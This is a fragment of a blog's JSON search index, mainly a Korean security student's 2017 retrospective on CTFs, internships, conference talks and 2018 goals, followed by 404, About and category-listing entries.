      "content"   : "<p>올 한해도 이렇게, 마무리가 되어간다. 지난 1년간 뭘하고 살았는지 간단하게 정리해보고\n다가오는 2018년에 대한 계획을 세워보자.</p>\n\n<h2 id=\"2017년을-마무리하면서\">2017년을 마무리하면서</h2>\n\n<p>16년 7월, 전역을 기점으로 BoB 5th를 시작했고 정신없는 2016년을 보냈다. 학교로 복학하고, BoB 도 마무리되고 역시나 이것 저것 해보고 싶은 것들 천지라 많은 계획을 세웠었는데 정작 돌아보니 생각했던 것만큼 다 해내진 못한 것 같아 아쉬움이 많이 남는 2017년이다.</p>\n\n<p><br /></p>\n<h3 id=\"1월\">1월.</h3>\n<p><code class=\"highlighter-rouge\">[BoB 5th 경연, LG R&amp;D 인턴]</code></p>\n\n<p>많은 것을 배우고, 팀원들이과 함께 진행했던 BoB 집체교육, 프로젝트 단계가 모두 끝나고 운좋게 경연 단계로 진출해 죽자사자 살았던 달이었다. 2016년 11월에 서초에 있는 LG전자 R&amp;D로 인턴을 시작했었는데 경연 단계랑 출퇴근이 겹치면서 정말 말 그대로 정신없는 날들이었기 때문..</p>\n\n<p>돌이켜보자면 <code class=\"highlighter-rouge\">\"9시 출근 - 6시 퇴근 - 7시부터 경연 과제, 공부 - 3시, 4시 취침 - 7시 기상. 출근 준비\"</code> 무한 반복.. 부서 차원에서 정말 많은 배려를 해주셔서 그나마, 빠지는 일정 없이 모든 걸 소화할 수 있었다.. LG에 있으면서 대기업 내에서 업무 프로세스가 어떻게 돌아가는지, 일을 어떻게 하는지 등.. 좋은 것들을 많이 배울 수 있었고, 여러 좋으신 분들과 인연을 만들 수 있었다. (감사합니다!)</p>\n\n<p><br /></p>\n<h3 id=\"2월\">2월.</h3>\n<p><code class=\"highlighter-rouge\">[2017 RSA Conference (샌프란시스코), BoB 5th 최종, LG R&amp;D 마무리]</code></p>\n\n<p>경연 단계도 마무리되어 다행히도, 최종 15인에 들 수 있었다. Best 10 선발 전에 해외 연수 기회로 샌프란시스코에서 개최되는 <code class=\"highlighter-rouge\">2017 RSA Conference</code> 에 참가할 수 있었는데, 약 10일 동안 정말 많은 경험과 함께, 좋은 추억을 만들 수 있었다. 다시 가고싶다.. 실리콘 밸리 탐방, Conference 참관 등 실로 행복한 날들이었다. (물론, 이 때도 과제가 생겨 새벽에 멘붕으로 회의 했던게 기억난다…)</p>\n\n<p>샌프란시스코 일정을 마무리하고, 3월에 있을 Best 10 선발을 위한 자문단 평가 준비하면서 2월을 보냈고, 복학의 사유로 3개월 가량 일했던 LG 전자 인턴을 마무리 했다. 마지막 날까지 응원을 해주시고, 조언해주신 부서 분들께 감사함을 느끼며 짧았던 인턴 기간을 마무리 할 수 있었다.</p>\n\n<p><br /></p>\n<h3 id=\"3월\">3월.</h3>\n<p><code class=\"highlighter-rouge\">[복학, BoB 5th 수료식, 2017 TROOPERS (독일)]</code></p>\n\n<p>제일 기억에 남는 BoB 5th 최종 자문단 평가, <code class=\"highlighter-rouge\">2017 TROOPERS Conference Speaker</code></p>\n\n<p>정말, 정신없이 학교로 돌아왔던 것이 기억이 난다. 2월 28일까지 근무하고 바로 부산으로 내려와 3월 2일에 복학했던 걸로 기억하는데… 12학번인 내게, 학교는 너무나 낯선 곳이 되어있었다;;; 다행이도, 아는 사람들이 아직 많이 있어 혼밥은 면했었다.. 군대 다녀와서 정신차린 것(??)에 대한 지도교수님의 배려로 Lab 한켠에 개인 자리를 배정 받을 수 있었고 제 2의 BoB 생활을 시작했다.. (집 가는게 귀찮아서, 하나씩 하나씩 집에서 무엇인가 가져와 basecamp 를 만들었다..)</p>\n\n<p>BoB를 하면서 만난 이전 수료생분들, 동기 교육생들, 멘토님들, 연구원님들 모두가 좋은 사람들이었고, 같은 분야에서 만나게 될 여러 사람들과 함께 할 수 있었던 좋은 기간이었다. 갓 전역한 군인 냄새 풀풀 나는 상태에서 꾸역꾸역 올라가 Best 10 이라는 과분할 수도 있는 성과를 얻어냈다. 정말 많은 BoB 교육생들과 좋은 인연을 만들고 군대에서부터 같이 공부해오던 친구들과도 각자 보람찬 결과를 일궈내었다. 부담이 되는 것도 사실이지만, 쨋든 1,500만원 get! 부모님 2/3 드리고, 1/3 가졌는데 어디에 썼는지도 모르게 증발한 것 같다.. 사실, 이더리움이랑 비트코인 사고 했었는데 이더리움은 사자마자 반토막 나서 존버하다가 본전되고 바로 손털었고.. 비트코인도 손절했었다.. <del>(지금까지 가지고 있었더라면 난 정말 행복했을텐데;;)</del></p>\n\n<p>쨋든, 자문단 발표 일정을 끝내고 다음날 바로, 독일 하이델베르크에서 개최했던 <code class=\"highlighter-rouge\">2017 TROOPERS Conference</code> 에서 발표할 수 있는 기회가 생겨 독일 여행을 7일간 할 수 있었다. BoB 기간 팀원들과 함께 진행한 프로젝트의 결과여서 더욱 뿌듯했고, 처음 가본, 유럽 국가이기도 하고 모든 것이 설레고, 신기하고, 새로웠다. 다시 한번, 세상은 넓고 나는 많이 부족하다는 것을 느낄 수 있었다. 어째저째 동행한 멘토님과 발표를 잘 마무리 했지만 나중에 올라온 영상을 보니, 발음이 여간 부끄러울 수 없었던 기억이..</p>\n\n<p><br /></p>\n<h3 id=\"4월\">4월.</h3>\n<p><code class=\"highlighter-rouge\">[학교 생활 (feat. 중간고사, 팀프)]</code></p>\n\n<p>한창 바빴던 일정이 조금 줄어들고, 정신차려보니.. 학교 과제 폭탄에 어느덧 중간 고사 기간이었다. 나는 2학년까지 마치고 군입대를 했었는데 워낙 조져놓은 2학년 성적에 대한 똥을 치우고자 부랴부랴 시험 공부, 팀프로젝트 등으로 4월 한달을 보냈다;;</p>\n\n<p><br /></p>\n<h3 id=\"5월\">5월.</h3>\n<p><code class=\"highlighter-rouge\">[개발 지식, CTF (HackXore), 5주년]</code></p>\n\n<p>BoB를 끝내고, 복학하면서 개인적으로 개발에 대한 욕심이 매우 커졌었는데 이를 위해서 이것 저것 목표를 세우고 개발관련 공부를 했었다. 버렸던 JAVA를 다시 보고, 객체 지향 설계 과목을 들으면서 좀 더 큰 단위의 프로젝트 프로세스에 대해 LG 전자에서 인턴한 경험을 덧붙여 새롭게 받아들이게 되었는데 보면 볼 수록, 개발도 만만치 않다는 것을 많이 느꼈던 시기이다..</p>\n\n<p>개발 욕심과 더불어, 그간 많이 참가하지 못했던 CTF에 대해서도 많은 참가를 계획했었는데 우연히 외쿡인 친구들과 함께 팀을 이루어 CTF를 한 계기로 지금까지 주욱 같이 해오고 있다. 1-2주에 1번꼴로 CTF Times에 기재된 CTF를 하고 있는데 꽤 재밌게 즐기고 있는 중. 하지만, 참가가 많아지는 만큼 못 풀었던 문제, 배워야할 부분 등이 어마어마하게 늘어났고 아직까지도 남아있는 항목들을 처리하느라 허덕거리고 있다.</p>\n\n<p>2012년, 첫 만남을 시작으로 현재 여자친구님과 5주년이 되었었다. 최근에는 2000일이라는 큰 행사가 다녀가셨는데, 쨋든 군대도, BoB 기간동안 하해와 같은 은혜로 잘 기다려준 여자친구님께 압도적인 감사를 표한다!</p>\n\n<p><br /></p>\n<h3 id=\"6월\">6월.</h3>\n<p><code class=\"highlighter-rouge\">[학교 생활 (feat. 기말고사, 팀프), ETRI 시작]</code></p>\n\n<p>중간 고사 친게 엊그제 같았는데, 어느새 팀프 마무리해야하고, 기말 고사 시즌이었다. 여느 때랑 다름없이 주말엔 CTF 하고, 평일엔 학교 수업, 과제 하는 날들을 보내다가 다시 한번 시험 준비로 정신 없이 보냈다. 다행이, 1학기 성적은 장학금 받을 정도로는 나와줘서 조져놓은 학점에 심폐소생술을 살짝 할 수 있었다.</p>\n\n<p>하계 방학이 다가오기에 ERTI에서 주관하는 청년 인턴 항목에 지원, 합격해서 대전 연구 단지에 가볼 수 있겠구나 들떠 보냈었다. <code class=\"highlighter-rouge\">지능보안 연구그룹</code>으로 지원했었는데 성적 증명서를 내면서 내심 조마조마 했지만, 다행이도 통과되어 방학 백수를 피할 수 있었다..</p>\n\n<p>1학기 때에는 주로, FrontEnd, 객체지향 설계 위주로 공부를 했다. 가장 눈에 띄는게 웹이어서 다시 HTML5, CSS3, JS, JQuery 공부를 위주로 하면서 OS 과목과 객체지향에 많은 시간을 할애했다. java, c 로 꾸역꾸역 프로젝트 하면서 Python 을 매우 그리워했었다..</p>\n\n<p><br /></p>\n<h3 id=\"7월\">7월.</h3>\n<p><code class=\"highlighter-rouge\">[대전-ETRI 인턴, 암호경진대회]</code></p>\n\n<p>하계 방학기간 동안, 대전 ETRI 본원에서 인턴을 했었다. <code class=\"highlighter-rouge\">지능보안 연구그룹</code>에서 2달 가량 또, 좋은 경험을 하면서 보냈었다. 주로 했던 것은 논문 survey, 프리젠테이션 등이었는데, 큰 부담주는 업무들은 아니어서 편한 마음으로 할 수 있는 것들을 했었다. 사원증 하나로 모든 결제를 할 수 있어 좋았지만, 나중에 들어오는 정산 내역을 보니.. 역시 돈은 내 수중에 있는 것만 써야하는 것 같다고 느꼈다.</p>\n\n<p>인턴하는 동안 고려대학교에서 개최하는 <code class=\"highlighter-rouge\">2017 암호 경진대회</code> 에 욕심을 가지고 도전했었는데 현실은 암담했다. 5문제 중에 2문제를 풀고는 험난한 암호 벽에 부딪혀 제출 못했던 것이 너무 아쉽다..</p>\n\n<p><br /></p>\n<h3 id=\"8월\">8월.</h3>\n<p><code class=\"highlighter-rouge\">[HITCON(대만), ETRI 마무리, 디지털 범인을 찾아라, 삼성 CTF 본선, 제주도]</code></p>\n\n<p>원래 HITCON 에 CFP 를 냈었는데 전산상의 문제로 제대로 접수되지 않았었다. 좀 더 제대로 확인하지 못한 내 불찰이 크다 ㅠ.. 하지만, 미리 BoB 팀원들과 일정 계획을 했었기 때문에.. 발표보다는 참관에 의의를 두고 대만에 다녀왔다. 3박 4일 일정에 같이 동고동락 했던, 팀원들과 좋은 추억 많이 만들고 열심히 돌아다녔다..</p>\n\n<p>국내 기업으로는 처음으로 삼성에서 상금을 걸고 CTF 를 주최했다. 운좋게도 본선에 참가하게 되었는데, 삼성 전자 R&amp;D 구경 잘하고 왔다. 역시나 괴물들 천지에서 본선 진출자 중 반타작 하고 살아 돌아왔다.. 24시간 동안 자리에서 일어나지 않고 문제만 푸는 사람들이 몇명 있었고 경외감이 들었으며 역시는 역시 역시였다. BoB 수료생이 상당수 있어 거의 총동문회 하는 느낌? 이달 주말 중에 BoB 6기 OT에 참가 했던 기억이 글을 쓰면서 났다. 그땐, 앞으로 구만리 같은 과제의 늪으로 갈 친구들에게 용기를 북돋아 줬었는데.. 어느덧 6기도 끝나가고 있는 걸 보고 소름..</p>\n\n<p>지난 달 접수 신청한, 제 5회 디지털 범인을 찾아라 문제를 받고 참가 기간 동안 꾸준히 계획을 세워 분석하면서 보냈다. 올해 목표가 대회 3관왕 달성이었기 때문에 할 수 있는 모든걸 하고자 많은 시간을 투자했던 기억이 난다. 아직도 풀리지 않는 출제자의 의도가 궁금하다..</p>\n\n<p>하계 방학동안 다시 한번, 몸에 사리를 쌓아가며 장거리 연애를 했던 여자 친구님과 제주도 여행을 끝으로 몸담았던, ETRI 인턴을 마무리하고 막판에 <code class=\"highlighter-rouge\">삼성 CTF - ETRI 종료 - 대만 - 제주도</code> 일정을 소화하고 부산으로 복귀했다.</p>\n\n<p><br /></p>\n<h3 id=\"9월\">9월.</h3>\n<p><code class=\"highlighter-rouge\">[2학기, 디지털 범인을 찾아라, HDCON]</code></p>\n\n<p>2학기가 시작되고, 새로운 과목들을 다시 또 시작하면서 계속 해오던 개발 관련 공부에 추가적으로 수강한 시스템 프로그래밍 과목이 꽤 흥미로웠다. IPC 를 비롯해서, Blocking, Non-Blocking, Mutex, CGI 등에 대한 전반적인 개념을 다시 잡고 실제 구현을 해보는 과정에서 C/C++ 로 많이 개발 공부하지 않은 것에 후회를 조금 했던 것 같다.</p>\n\n<p>9월 마지막 주에 디지털 범인을 찾아라 보고서 제출이 마감되었는데 마감 5일전부터 보고서를 작성하기 시작해서, 하루 3시간씩 자며 완성해 제출했다.. 틈틈이 써놓을 걸 하는 생각을 수십번 하면서, 놓친게 없나 확인하느라 상당히 애먹었다.</p>\n\n<p>HDCON 에 RebForPwn 팀원들과 참가했었는데, 혼돈의 도가니, 혼돈콘이었던 것만 기억에 남는다.. 본선에는 못갔지만 Training 이벤트에 당첨되어서 Embedded Training 을 본선날 무료로 수강할 수 있었다. 트레이닝 구성을 봤을 때는 조금 기대가 많았는데 정작, MIPS ASM 복습한 기억밖에 안남는다.. MIPS ASM 가르치시느라 정작 뒤쪽의 취약점 분석 관련 내용에 대해 많이 언급이 안된 것이 아쉽다..</p>\n\n<p><br /></p>\n<h3 id=\"10월\">10월.</h3>\n<p><code class=\"highlighter-rouge\">[KDFS, 정보보호학회 논문, SW 개발보안 경진대회]</code></p>\n\n<p>제일 긴 추석 연휴동안 KDFS Challenge 를 했다. 기간은 6월 부터 였는데 이론적인 부분만 깨작 깨작 하다가, 본 개발은 추석 연휴때 후다닥 하느라 정신 없이 보냈다. 결과적으론 입상하지 못했지만 팀원들이랑 해커톤 하는 기분으로 좋은 추억 만들었다.</p>\n\n<p>정보보호학회에 몇몇 친구들과 함께 논문을 제출했다. 악성코드, 머신러닝 관련이었는데 나는 판별하는 룰셋을 주로 했고 각자 논문 작성, 코드 구현 등 업무 분담해서 잘 진행했다. 발표 다녀온 팀원 말로는 나름 괜찮은 반응이었다고 한다.</p>\n\n<p>RebForPwn 에 같이 소속된 형이랑 SW 개발보안 경진대회에 참가했다. 모바일 부분으로 참가했는데.. 솔직히 같이한 형이 거의 캐리하셨다. 디범찾이랑 이것저것 정말 많이 신경쓸게 많아 많은 도움이 못되었어서 죄송했는데 그래도 우수상이라는 성과를 얻을 수 있어서 다행이었다..</p>\n\n<p><br /></p>\n<h3 id=\"11월\">11월.</h3>\n<p><code class=\"highlighter-rouge\">[BISC, 정보보호 R&amp;D Challenge, AV Tokyo (일본), WhiteHat 본선]</code></p>\n\n<p>BoB 동기 형에게 고려대 정보보호 R&amp;D Challenge 해볼 생각이 있냐고 제의 받아서 CAN Network Traffic Detection 부분에 참가했다. 4명이서 한팀으로 나는 시각화 도구 개발 관련 업무를 중점적으로 맡아 진행했다. 기대 많이 했었는데 ㅠ 아쉽게도 수상은 못했다. 그래도 AJAX, JQuery, Rest API 등 개발 공부를 많이 해서 뿌듯.</p>\n\n<p>BISC 에서 Forensic CTF 문제 출제를 맡아 진행했다. 흠.. 급작스럽게 결정되어 이것 저것 만들긴 했는데 운영 상에 미흡히 진행했던 부분이 많아 죄송하기도 하고 아쉽기도 했다. 그래도 풀어주시는 분들이 있어 다행..</p>\n\n<p>AV Tokyo Conference 에 CFP 가 통과되어 발표자로 도쿄에 다녀왔다. 올 한해는 여행을 참 많이 다닌 것 같아 나름 뿌듯하다. 나는 1차로 독일에서 발표한지라, 같이 간 동생이 주로 발표를 도맡아 진행했고, 학기중이라 주말에 2박3일이라는 짧은 일정으로 다녀왔다. 그래도 여기저기 구경 잘하고 와서 만족스럽다</p>\n\n<p>군대에서부터 같이 CTF 하고, 보안 공부하는 친구들과 RebForPwn 팀원들과 함께 3번째로 참가한 WhiteHat 에서 드디어, 본선 참가 순위에 들 수 있었다. 매년 아쉬운 등수로 본선에 가지 못했었는데, 올해 목표로 세운 본선 참가 달성에 뜻깊은 의미를 두었다. 참가한 본선에서는 10개팀 중, 8위를 했는데.. 정작 내가 맡은 리버싱 쪽에서 점수를 많이 못내 짐이 된 기분이었다 ㅠ  역시나 본선장에서 다른 팀들보니 더 열심히 하고 싶은 의욕이 솟구쳤고, 공부 좀 많이 해야겠다고 다시 다짐..</p>\n\n<p><br /></p>\n<h3 id=\"12월\">12월.</h3>\n<p><code class=\"highlighter-rouge\">[디지털 범인을 찾아라 수상. 학교 생활 (feat. 기말고사, 팀프)]</code></p>\n\n<p>1학기에 비해, 많이 바빴던 2학기도 어느 순간 기말고사, 팀프 마무리 시즌이 다가왔다… 2학기 팀프는 진짜 최악이었던 아픈 기억이다 ㅠ.. 아쉬운건, 1학기에 비해 1개 과목에 대해 공부를 제대로 못해 시험을 못친건데.. 나름 시간 관리 한다고 평소에 자부했지만 학교 성적 결과만 놓고 보자면 뭐 생각만큼 잘했는 것 같지는 않다.</p>\n\n<p>9월에 제출했던 디지털 범인을 찾아라에서 대상을 수상하였다. 준비하면서 좋은 결과가 있기를 정말 바랬었는데 노력에 결과로 이런 좋은 성과가 생겨 기뻤다. 과학 수사 학술대회에서 검찰총장님 상장 수여 받고, 대검찰청 디지털 포렌식 센터 견학도 하고, 검찰청 밥도 먹었다. 우스갯소리로 군 시절때, 후임들한테 밥경찰이냐 밥검찰이냐 밥도둑이냐 했던 기억이 났었는데 대검찰청 밥은 밥도둑이었다…!</p>\n\n<p><br /></p>\n<h3 id=\"그래서\">그래서..</h3>\n\n<p>뭔가 했는 것은 많은 2017년인데, 정작 갈증은 해소되지 않은 느낌이다.\n리버싱, 암호학, 포렌식, 개발 위주로 공부를 했었는데 리버싱 공부는 정작 많이 못했던 것 같다. 개발도 데이터 분석, 머신 러닝 쪽에 관심을 두고 진행해볼까 했었는데 흐지부지.. 암호학 공부는 조금 한 느낌이 나는데, 역시나 수학에 대한 중요성을 다시금 느꼈다. 포렌식도 모바일, OSX 쪽 공부를 해보고 싶었는데 CTF 문제 위주, Windows 분석 쪽으로만 중점을 뒀던게 아쉽다. ROP 이후로 놓았던, Pwnable 에 대한 욕심도 좀 있었는데 Heap 쪽에서 진도가 많이 나가지 못했다.</p>\n\n<p>공부하는 방식이 나는 CTF 문제를 풀면서 많이 느끼고, 관련 지식을 찾아서 공부 하는 편인데 너무 많은 것을 하려는 욕심이 오히려 독이 된 것 같은 느낌이다.</p>\n\n<p><br /></p>\n<h3 id=\"2018년에는\">2018년에는..</h3>\n<ul>\n  <li><i>대학원 고민\n</i>    <ul>\n      <li>이건 아직까지 많은 고민이다.. 바로 취업을 하고 싶기도 하지만, 아직 공부해보고 싶은게 많아 대학원 진학에도 뜻을 두고 있다..\n<br /></li>\n    </ul>\n  </li>\n  <li><i>일본\n</i>    <ul>\n      <li>1월부터 1달간, 일본에 가서 프로젝트 할 일이 생겼다. 2018년의 시작이 해외에서의 업무라 걱정이긴 하지만, 좋은 기회일 것 같아서 선택했다. 가서 재정비하는 시간도 좀 가지고, 착실하게 1년 계획도 세우고 올 생각이다.\n<br /></li>\n    </ul>\n  </li>\n  <li><i>토익\n</i>    <ul>\n      <li>졸업 학년이라, 영어 성적이 필요하다.. 해외 다녀보면서 영어 중요성 뼈저리게 느꼈는데, 의사 소통 하는데는 큰 문제가 없었지만 과연 시험 성적은 어떨지..\n<br /></li>\n    </ul>\n  </li>\n  <li><i>TOPCIT\n</i>    <ul>\n      <li>학교 교수님이 TOPCIT 출제 위원이라 정기적으로 3-4학년들의 참가를 권하는데, 이번 2학기땐 아예 성적 반영으로 해버리셨었다. 하필, 시험 당일날 결혼식 일정이 있어서 30분 밖에 문제 풀 시간이 없었는데.. 풀수 있는 걸 먼저 풀고 나머진.. 찍기 신공으로 커버했다.. 200점 초반대가 나왔는데 30분 푼것 치고는 만족(?)한다.. 가 아니라 무성의하게 시험친것 같아 아쉽다. 때문에, 2018년에는 수준 3에서 500점대를 목표로!\n<br /></li>\n    </ul>\n  </li>\n  <li><i>보안산업기사, 기사\n</i>    <ul>\n      <li>군대에 있을 때, 보안 산업기사 필기를 합격해놓고 아직 실기를 안치고 있었는데.. 곧 있으면 2년이 갱싱되어 다시 쳐야 할 상황이 되어 버릴것 같다. 산업기사는 실기 준비하고, 기사는 필기부터 시작해서 1학기내에 자격 갱신하는 것이 목표다.\n<br /></li>\n    </ul>\n  </li>\n  <li><i>캡스톤\n</i>    <ul>\n      <li>학부생의 꽃. 졸작! 넘어야할 산이 왔다..\n<br /></li>\n    </ul>\n  </li>\n  <li><i>real world 취약점\n</i>    <ul>\n      <li>2017년에 아쉬웠던 점이, KISA 집중 포상 신고기간에 IoT 제품 취약점을 못한 것인데 취약점 분석을 위해 2개 정도 기기를 사놓고 분석을 하다가 다른 업무에 치여, 분석하다 그대로 놔뒀다.. 친구집에 놀러 갔다가 IoT 정수기가 있어 바로, 노트북 꺼내서 분석했던 기억이.. 올해 목표는 real world 취약점 신고 5개이다.\n<br /></li>\n    </ul>\n  </li>\n  <li><i>2017년 부족했던 목표 항목 다시 계획\n</i>    <ul>\n      <li>가장 중요한 항목이 아닐까 싶다. 1월 한 달간, 내가 진짜 해야할 일이 뭔지 세세하게 분류하고 2017년에 제대로 달성하지 못한 목표 항목을 정리해서 다시 정진하도록 해야겠다.</li>\n    </ul>\n  </li>\n</ul>\n\n<h3 id=\"2017년-정리-끝\">2017년 정리 끝!</h3>\n"
    } 
  
  ,
  
   {
     
        "title"    : "404: Page not found",
        "category" : "",
        "tags"     : "",
        "url"      : "/404.html",
        "date"     : "",
        "content"  : "<div class=\"page\">\n  <h1 class=\"page-title\">404: Page not found</h1>\n  <p class=\"lead\">Sorry, we've misplaced that URL or it's pointing to something that doesn't exist. <a href=\"/\">Head back home</a> to try finding it again.</p>\n</div>\n"
     
   } ,
  
   {
     
        "title"    : "About",
        "category" : "",
        "tags"     : "",
        "url"      : "/about/",
        "date"     : "",
        "content"  : "<p class=\"message\">\n  <a href=\"https://brunch.co.kr/magazine/8percent\">8퍼센트 개발팀</a>에서 일하고 있는 초보 주니어 개발자<br />\n  (꾸준히 하다보면 점점 나아지겠지 하는 마음으로)<br />\n  공부한 내용을 정리하는 블로그입니다. <br />\n  <a href=\"https://www.rocketpunch.com/@wayhome25\">로켓펀치 프로필</a><br />\n</p>\n\n<h2 id=\"참여-활동--세미나\">참여 활동 &amp; 세미나</h2>\n<ul>\n  <li><a href=\"http://blog.pycon.kr/2017/12/27/python-seminar/\">파이썬 연말 세미나</a> 2017.12</li>\n  <li><a href=\"https://brunch.co.kr/@leehosung/42\">8퍼센트 두숟갈 스터디</a>, 2017.07~2017.12</li>\n  <li><a href=\"https://www.pycon.kr/2017/\">파이콘 한국</a>, 2017.08.12~15</li>\n  <li><a href=\"https://nomade.kr/moim/askdjango-hackathon-2017/\">AskDjango 무박 2일 해커톤</a>, 2017.08.05~06</li>\n  <li><a href=\"https://djangogirls.org/seoul/\">2017 장고걸스 워크샵</a>, 2017.06.23~24</li>\n  <li><a href=\"http://korea-womendevelopers.org/\">여자개발자 모임터 10주년 세미나</a>, 2017.06.10</li>\n</ul>\n\n<!-- ## 공부한 것\n- 컴퓨터공학 (자료구조, 알고리즘)\n    - 패스트캠퍼스 컴퓨터 공학 입문 (2017/03-04) [강의 커리큘럼](http://cdn.www.fastcampus.co.kr/wp-content/uploads/2017/02/%EC%BB%B4%ED%93%A8%ED%84%B0%EA%B3%B5%ED%95%99-%EC%9E%85%EB%AC%B8-SCHOOL-2%EA%B8%B0_%EC%BB%A4%EB%A6%AC%ED%81%98%EB%9F%BC-%EB%B0%8F-%EA%B5%90%EC%9C%A1-%EC%95%88%EB%82%B4%EB%AC%B8.pdf?_ga=1.240441345.321893628.1483015444)\n    - oop, memory, data structure, algorithm, network, DB\n\n- Django\n  - [8퍼센트 두숟갈 스터디 참여](https://8percent.github.io/2017-06-30/%EC%8A%A4%ED%84%B0%EB%94%94%EC%8B%9C%EC%9E%91/)\n  - [Two Scoops of Django](https://www.twoscoopspress.com/products/two-scoops-of-django-1-11)\n  - [AskDjango - 장고 기본편 (이진석)](https://nomade.kr/vod/django/)\n  - [Django로 배우는 쉽고 빠른 웹 개발 파이썬 웹 프로그래밍 실전편](http://www.yes24.com/24/goods/29331035?scode=029)\n  - [Django로 배우는 쉽고 빠른 웹 개발 파이썬 웹 프로그래밍 기본편](http://www.hanbit.co.kr/store/books/look.php?p_code=B5790464800)\n  - [파이썬 웹 프로그래밍 – Django로 웹 서비스 개발하기 (정호영)](https://www.inflearn.com/members/hyunjoo_lee_1/course/)\n\n- python\n\t- [처음 시작하는 파이썬](http://www.hanbit.co.kr/store/books/look.php?p_code=B2827459900)\n  - [파이썬 입문 (tryhelloworld)](http://tryhelloworld.co.kr/courses/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9E%85%EB%AC%B8)\n\n- Java\n  - [Java (생활코딩)](https://opentutorials.org/course/1223/4551)\n  - [점프 투 자바](https://wikidocs.net/265)\n\n- git\n    - [지옥에서 온 git (생활코딩)](https://opentutorials.org/module/2676)\n\n- NodeJS\n  - [nodeJS (생활코딩)](https://opentutorials.org/course/2136)\n\n- Javascript\n  - [웹 애플리케이션 만들기 (생활코딩)](https://opentutorials.org/course/1688)\n  - [Javascript (생활코딩)](https://opentutorials.org/course/743)\n  - [웹브라우저 Javascript (생활코딩)](https://opentutorials.org/course/1375)\n  - [Web Front-End (윤지수)](http://olc.kr/course/course_online_view.jsp?id=470)\n\n- 파이어베이스\n  - [파이어베이스(Firebase)를 이용한 간단한 웹 어플리케이션 만들기 (인프런)](https://www.inflearn.com/course/%ED%8C%8C%EC%9D%B4%EC%96%B4%EB%B2%A0%EC%9D%B4%EC%8A%A4-%EA%B0%95%EC%A2%8C-%EC%9B%B9-%EC%96%B4%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98/) -->\n\n<!-- ## 만들어 본 것\n\n- [사내 도서관리 웹어플리케이션(진행중)](https://github.com/wayhome25/our-book)\n  - 도서 검색 및 DB 등록 (네이버 검색 API 활용)\n  - 도서 대여 및 연체관리\n    - 대여 / 반납 기능\n    - 연체시 email, slack을 통한 알림\n  - 구매 희망도서 신청\n  - 도서목록 csv 다운로드\n  - 유저간 쪽지 교환 기능\n\n- [인스타그램st 웹어플리케이션 구현](https://github.com/wayhome25/Instagram)\n  - Django를 활용하여 인스타그램 기능을 가진 웹어플리케이션을 구현합니다.\n  - 동작하는 단위별로 commit을 추가한다. 코드 리뷰를 고려한 commit 메시지를 작성한다.\n  - 필요한건 Django 공식 문서, stackoverflow를 찾아보고 문제를 해결한다.\n  - 궁금한 코드는 Django 소스코드 를 열어서 직접 읽어본다.\n\n- [두번째 Django 프로젝트 영어 스터디용 게시판](https://github.com/wayhome25/django_english_project)\n    - django의 기본적인 기능을 활용하여 영어 스터디에서 사용할 게시판을 만들었습니다.\n    - 인증기능 (로그인, 로그아웃)\n    - CRUD (글 추가, 조회, 갱신, 삭제)\n    - 댓글기능 (Many-to-one relationships)\n    - summernote package를 활용한 WYSWYG editor 적용\n\t- CBV Listview 활용\n    - bootstrap을 사용하여 마크업\n\n- [첫번째 Django 프로젝트 메모 게시판](https://github.com/wayhome25/django_memo_project)\n    - 인증기능 (회원가입, 로그인, 로그아웃)\n    - CRUD (글 추가, 조회, 갱신, 삭제)\n    - 좋아요 기능 (Many-to-one relationships, 비동기 ajax 통신)\n    - 정렬기능 (좋아요순, 최신순)\n    - python, django, javascript, bootstrap, pythonanywhere\n\n- firebase 연습을 위해서 만든 [simple to-do list](https://simple-todolist.firebaseapp.com/)\n  - firebase, javascript, html, css, materialize ui framework\n\n- 프론트엔드 연습목록\n\t- [bootstrap 그리드 시스템, sass를 활용한 프로젝트용 웹 사이트 마크업](https://wayhome25.github.io/fastcampus_school/homework/10km/)\n\t- [sass를 활용한 텀블벅 웹 페이지 마크업](https://wayhome25.github.io/fastcampus_school/01_html-css/tumblbug/projects.html)\n\t- [직접 제작한 그리드 시스템을 활용한 쇼핑몰 메인화면 레이아웃](https://wayhome25.github.io/front-end/practice_team_activity)\n\t- [반응형 웹 페이지 ](https://wayhome25.github.io/small_project/responsive_website/)\n\t- [그 밖의 프론트엔드 연습목록](https://github.com/wayhome25/front-end/blob/master/Readme.md) -->\n"
     
   } ,
  
   {
     
   } ,
  
   {
     
        "title"    : "Categories",
        "category" : "",
        "tags"     : "",
        "url"      : "/blog/categories/",
        "date"     : "",
        "content"  : "<div class=\"tags-expo\">\n  <div class=\"tags-expo-list\">\n    \n    <a href=\"#life\" class=\"post-tag\">life</a>\n    \n    <a href=\"#ctf\" class=\"post-tag\">CTF</a>\n    \n    <a href=\"#2017-sha\" class=\"post-tag\">2017_SHA</a>\n    \n    <a href=\"#etc\" class=\"post-tag\">etc</a>\n    \n    <a href=\"#2018-acebear\" class=\"post-tag\">2018_AceBear</a>\n    \n    <a href=\"#2018-codegate\" class=\"post-tag\">2018_Codegate</a>\n    \n    <a href=\"#2018-acebear\" class=\"post-tag\">2018_acebear</a>\n    \n    <a href=\"#2018-sharif\" class=\"post-tag\">2018_Sharif</a>\n    \n    <a href=\"#2018-securinets\" class=\"post-tag\">2018_Securinets</a>\n    \n    <a href=\"#2018-ndh\" class=\"post-tag\">2018_NDH</a>\n    \n  </div>\n  <hr/>\n  <div class=\"tags-expo-section\">\n    \n    <h2 id=\"life\">life</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/life/2017/12/31/2017%EB%85%84-%ED%9A%8C%EA%B3%A0%EB%A1%9D/\">\n      <li>\n        2017년 회고록\n       <small class=\"post-date\">31 Dec 2017</small>\n      </li>\n      </a>\n      \n    </ul>\n    \n    <h2 id=\"ctf\">CTF</h2>\n    <ul class=\"tags-expo-posts\">\n      \n        <a class=\"post-title\" href=\"/ctf/2018_ndh/2018/04/02/NUIT-DU-HACK-CTF-Kebab-STO-350/\">\n      <li>\n        [2018_NUIT_DU_HACK_CTF] Kebab STO(350)\n       <small class=\"post-date\">02 Apr 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_securinets/2018/03/26/Securinets-CTF-duck-hunt-300/\">\n      <li>\n        [2018_Securinets_CTF] duck_hunt(300)\n       <small class=\"post-date\">26 Mar 2018</small>\n      </li>\n      </a>\n      \n        <a class=\"post-title\" href=\"/ctf/2018_sharif/2018/02/16/Sharif-CTF-RunMe-50/\">\n      <li>\n        